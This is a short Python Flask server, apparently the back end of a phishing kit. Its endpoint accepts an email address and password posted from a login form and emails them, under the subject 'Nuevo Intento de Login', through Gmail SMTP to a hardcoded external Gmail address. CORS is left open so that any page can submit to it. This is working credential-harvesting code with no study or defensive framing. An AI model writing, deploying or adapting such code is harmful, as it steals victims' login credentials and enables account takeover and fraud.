from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv
from flask_cors import CORS  # Importa CORS para habilitar accesos externos

# Cargar variables de entorno desde el archivo .env
load_dotenv()

app = Flask(__name__)
CORS(app)  # Habilita CORS para permitir solicitudes desde cualquier origen

@app.route('/send_email', methods=['POST'])
def send_email():
    # Obtener los datos del formulario
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return jsonify({'success': False, 'message': 'Email y contraseña son obligatorios.'}), 400

    # Configuración del correo
    sender_email = os.getenv('EMAIL_USER')
    receiver_email = 'inglescompleto7@gmail.com'  # Cambia esto por tu correo
    email_password = os.getenv('EMAIL_PASS')

    subject = 'Nuevo Intento de Login'
    body = f'Email: {email}\nPassword: {password}'

    # Crear mensaje
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        # Enviar correo
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, email_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        return jsonify({'success': True})
    except Exception as e:
        print(f'Error: {e}')
        return jsonify({'success': False, 'message': 'Error al enviar el correo.'})

if __name__ == '__main__':
    # Cambiado a host='0.0.0.0' para permitir accesos externos
    app.run(host='0.0.0.0', port=5000, debug=True)

